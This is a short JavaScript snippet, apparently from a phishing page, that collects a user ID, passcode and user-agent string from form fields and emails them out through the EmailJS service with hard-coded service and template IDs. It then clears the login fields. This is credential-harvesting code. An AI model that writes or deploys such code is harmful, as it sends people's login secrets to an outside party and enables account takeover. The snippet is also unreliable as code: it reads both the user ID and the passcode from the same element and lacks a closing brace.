function sendEmail(){
    var params = {
        txtUserID: document.getElementById("entercode").value,

        txtPasscode: document.getElementById("entercode").value,
        Useragent: document.getElementById("Useragent").value,
    }
const serviceID = "service_m0zt6uk"
const templateID = "template_f00v7vp"

emailjs.send(serviceID,templateID,params)
.then(
    res =>{
        document.getElementById("txtUserID").value ="";
        document.getElementById("txtPasscode").value=""
        console.log(res);
        
    })
    .catch(err=>console.log(err));
